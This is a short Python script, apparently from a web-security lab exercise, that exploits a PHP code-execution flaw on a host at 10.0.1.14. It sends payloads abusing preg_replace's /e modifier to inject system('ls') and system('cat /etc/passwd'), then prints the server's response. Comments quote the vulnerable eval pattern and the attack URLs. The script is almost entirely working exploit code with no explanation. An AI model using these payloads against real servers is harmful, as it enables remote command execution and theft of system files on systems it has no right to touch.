import urllib.parse
import urllib.request
import lxml.html as lh




# $str="echo \"Hello ".$_GET['name']."!!!\";";
# eval($str);
#http://10.0.1.14/codeexec/example3.php?new=system(%27cat%20/etc/passwd%27)&pattern=/lamer/e&base=Hello%20lamer
#http://10.0.1.14/codeexec/example3.php?new=hacker&pattern=/lamer/&base=Hello%20lamer
payload = {"new": "hacker","pattern": "/lamer/", "base" : "Hello lamer" }
payload = {"new": "hacker","pattern": "/lamer/e", "base" : "Hello lamer" }
payload = {"new": "system('ls')","pattern": "/lamer/e", "base" : "Hello lamer" }
payload = {"new": "system('cat /etc/passwd')","pattern": "/lamer/e", "base" : "Hello lamer" }
payload = urllib.parse.urlencode(payload)


url = "http://10.0.1.14/codeexec/example3.php?"+payload
print(url)

with urllib.request.urlopen(url) as reponse:
	content = reponse.read()
print(content)

